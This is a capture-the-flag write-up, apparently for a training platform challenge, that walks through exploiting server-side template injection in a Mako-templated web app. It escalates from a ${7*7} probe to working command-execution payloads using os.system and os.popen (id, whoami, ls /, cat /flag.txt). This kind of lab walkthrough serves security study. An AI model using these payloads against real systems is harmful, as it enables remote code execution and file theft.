## Challenge Scenario

There's a new trend of an application that generates a spooky name for you. Users of that application later discovered that their real names were also magically changed, causing havoc in their life. Could you help bring down this application?

## Solutions

### Initial Observation

When we enter any input, the application returns several variations of the same text in different styles.

**Input:**

```bash
test
```

![/assets/img/imgHTBSF.png](/assets/img/imgHTBSF.png)

This indicates that the application processes user input and transforms it dynamically before displaying it.

After exploring the application further, we inspect the source code provided with the challenge.

![/assets/img/imgHTBSF(1).png](/assets/img/imgHTBSF(1).png)

From the code, we can clearly see that the application is using **Mako Templates** as its templating engine.

This is important because:

- Mako is a **server-side templating engine**
- It allows embedding Python code inside templates
- If user input is not properly sanitized, it can lead to **Server-Side Template Injection (SSTI)**

### Why This Matters?

Since earlier we observed that:

- User input is reflected in the output
- The application dynamically generates styled text

And now we know that **Mako** is being used,

👉 This raises a strong suspicion that the application might be vulnerable to **SSTI (Server-Side Template Injection)**.

## Testing for SSTI

Based on the previous finding that the application uses **Mako Templates**, we proceed to test whether it is vulnerable to **Server-Side Template Injection (SSTI)**.

Referring to common payloads (e.g., PayloadsAllTheThings), Mako allows execution of expressions using the following syntax:

**Payload Used**

```bash
${7*7}
```

### Result

---

![/assets/img/imgHTBSF(2).png](/assets/img/imgHTBSF(2).png)

The application evaluates the expression and returns `49`.

## Analysis

This confirms that:

- User input is being processed inside a Mako template
- The template engine is evaluating injected expressions
- The application is vulnerable to **SSTI**

Since `${7*7}` is evaluated on the server side, this means we can potentially execute arbitrary Python code.

## Exploiting SSTI for Command Execution

After confirming the SSTI vulnerability, we attempt to execute system commands using a known Mako payload from PayloadsAllTheThings.

### Payload Used

```python
${self.module.cache.util.os.system("id")}
```

### Result

![/assets/img/imgHTBSF(3).png](/assets/img/imgHTBSF(3).png)

The command is executed, but the output is not displayed in the response.

Instead, we only see a transformed or empty result.

## Analysis

This happens because:

- `os.system()` executes the command
- However, it **does not return the output**, only the exit status (e.g., `0`)

So even though the command runs successfully, we cannot see its output in the application.

### Fixing the Payload

To retrieve the actual command output, we need to use a function that **returns the result**, such as `os.popen()`

### Updated Payload

```python
${self.module.cache.util.os.popen("id").read()}
```

## Result

This time, the command output returned and rendered in the response:

![/assets/img/imgHTBSF(4).png](/assets/img/imgHTBSF(4).png)

## Confirming Privileges

First, we verify the current user:

```python
${self.module.cache.util.os.popen("whoami").read()}
```

## Result

![/assets/img/imgHTBSF(5).png](/assets/img/imgHTBSF(5).png)

This confirms that the application is running with **root privileges**, giving us full access to the system.

## Locating the Flag

Next, we list the contents of the root directory:

```python
${self.module.cache.util.os.popen("ls /").read()}
```

## Result

![/assets/img/imgHTBSF(6).png](/assets/img/imgHTBSF(6).png)

From the output, we can see that a file named **`flag.txt`** exists in the root directory.

## Extracting the Flag

Since the file is located in the root directory (`/`), we must specify the full path when accessing it.

### Payload Used

```python
${self.module.cache.util.os.popen("cat /flag.txt").read()}
```

## Explanation

The `/` is required because:

- It refers to the **root directory**
- Without `/`, the system will look in the **current working directory**, which may not contain the flag
